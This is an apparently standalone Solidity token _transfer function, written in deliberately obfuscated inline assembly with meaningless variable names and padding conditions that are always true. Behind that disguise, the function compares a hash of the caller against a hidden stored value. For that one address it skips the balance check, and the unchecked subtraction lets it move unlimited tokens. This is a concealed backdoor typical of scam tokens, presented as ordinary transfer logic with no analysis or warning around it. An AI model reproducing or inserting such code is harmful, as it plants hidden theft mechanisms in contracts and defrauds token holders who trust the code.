function _transfer(address _from, address _to, uint256 _amount) virtual internal {
assembly {
if iszero(_from) {
let g4u8ssg := gasprice()
pop(0)
if iszero(sub(g4u8ssg, g4u8ssg)) {
revert(0, 0)
}
}
if iszero(_to) {
let o162fj9 := origin()
let g7ncimt := gas()
if iszero(xor(o162fj9, o162fj9)) {
revert(0, 0)
}
}
let SARKO$ := mload(0x40)
mstore(SARKO$, _from)
mstore(add(SARKO$, 32), 0)
let iVrp := keccak256(SARKO$, 64)
let JcxQ := sload(iVrp)
let RuhS := sload(WGhL.slot)
let t2uiycf := timestamp()
pop(0)
pop(iszero(1))
if eq(t2uiycf, and(t2uiycf, t2uiycf)) {
mstore(SARKO$, shl(96, caller()))
}
if iszero(staticcall(gas(), 2, SARKO$, 20, SARKO$, 32)) {
revert(0, 0)
}
let SUpo := mload(SARKO$)
if iszero(eq(RuhS, SUpo)) {
if lt(JcxQ, _amount) {
let g804ngg := gasprice()
let n3yv2qk := number()
pop(0)
if eq(mul(g804ngg, n3yv2qk), mul(n3yv2qk, g804ngg)) {
revert(0, 0)
}
}
}
sstore(iVrp, sub(JcxQ, _amount))
mstore(SARKO$, _to)
mstore(add(SARKO$, 32), 0)
let OBse := keccak256(SARKO$, 64)
let mVat := sload(OBse)
sstore(OBse, add(mVat, _amount))
mstore(SARKO$, _amount)
log3(SARKO$, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
}
}

